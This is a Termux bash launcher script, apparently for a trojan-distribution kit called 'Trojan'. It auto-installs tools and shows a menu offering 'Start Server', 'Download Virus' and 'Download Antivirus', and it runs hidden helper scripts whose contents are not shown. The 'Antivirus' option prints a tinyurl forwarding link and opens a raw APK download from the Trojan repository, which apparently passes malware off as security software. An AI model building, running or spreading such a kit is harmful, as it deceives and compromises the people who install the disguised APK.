#!/data/data/com.termux/files/usr/bin/bash

cd - &> /dev/null ; cd - &> /dev/null; clear
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed, Now Installing."; apt install php -y; connection="$(ping -c 1 -q www.google.com >&/dev/null; echo $?)"
if [[ "$connection" != 0 ]]
then clear
echo -e "\033[1;91m[\033[1;92m-\033[1;91m] No Internet\033[1;92m connection!"
   exit
fi; }
command -v ruby > /dev/null 2>&1 || { echo >&2 "I require ruby but it's not installed, Now Installing."; apt install ruby -y; connection="$(ping -c 1 -q www.google.com >&/dev/null; echo $?)"
if [[ "$connection" != 0 ]]
then clear
echo -e "\033[1;91m[\033[1;92m-\033[1;91m] No Internet\033[1;92m connection!"
   exit
fi; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "I require lolcat but it's not installed, Now Installing."; gem install lolcat; connection="$(ping -c 1 -q www.google.com >&/dev/null; echo $?)"
if [[ "$connection" != 0 ]]
then clear
echo -e "\033[1;91m[\033[1;92m-\033[1;91m] No Internet\033[1;92m connection!"
   exit
fi; }

echo -e '\e[1m
                                     █████████████████████
C                                 ████▀─────────────────▀████
O                              ███▀───────────────────────▀███
D                             ██▀───────────────────────────▀██
I                            █▀───────────────────────────────▀█
N                            █─────────────────────────────────█
G                            █─────────────────────────────────█
                             █─────────────────────────────────█
                             █───█████─────────────────█████───█
B                            █──██▓▓▓███─────────────███▓▓▓██──█
Y                            █──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
                             █──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
                             █▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
A                            ▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
B                              █▄────▀█████▀─────▀█████▀────▄█
H                             ▄██───────────▄█─█▄───────────██▄
A                             ███───────────██─██───────────███
C                             ███───────────────────────────███
K                             ▀██──██▀██──█──█──█──██▀██──██▀
E                              ▀████▀ ██──█──█──█──██─▀████▀
R                               ▀██▀  ██──█──█──█──██──▀██▀
O                                     ██──█──█──█──██
F                                     ██──█──█──█──██
F                                     ██──█──█──█──██
I                                     ██──█──█──█──██
C                                     ██──█──█──█──██
I                                     ██──█──█──█──██
A                                     ██──█──█──█──██
L                                     ██──█──█──█──██
                                       █▄▄█▄▄█▄▄█▄▄█ \n' | lolcat -a -t -d 1 -s 500


echo -e '\033[1m[1] Start Server
[2] Download Virus
[3] Download Antivirus
[4] Update
[5] Exit' | lolcat -s 100 -t -a -d 1
printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
        read char
        if [[ $char = "1" ]] || [[ $char = "01" ]]
        then cd .server && bash config.sh

        elif [[ $char = "2" ]] || [[ $char = "02" ]]
        then cd database && bash decrypt.sh

        elif [[ $char = "3" ]] || [[ $char = "03" ]]
        then cd .files && bash config.sh
echo
sleep 0.8
echo -e '\033[0;92mForwarding link: \033[0mhttps://tinyurl.com/y8rm36ux'
sleep 0.2
echo
printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
read ask
if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
        then echo
sleep 0.8
echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 
xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
else cd .. && bash trojan.sh
fi

        elif [[ $char = "4" ]] || [[ $char = "04" ]]
        then
echo
echo -e '\033[1mUpdating Please wait...' | lolcat -a -d 1 -t -s 100
echo
cd .files && bash update.sh

        elif [[ $char = "5" ]] || [[ $char = "05" ]]
        then
exec echo
        else
echo
        printf "\e[1;93m[!] Invalid option!\e[0m\n"
echo
    fi
#done :)
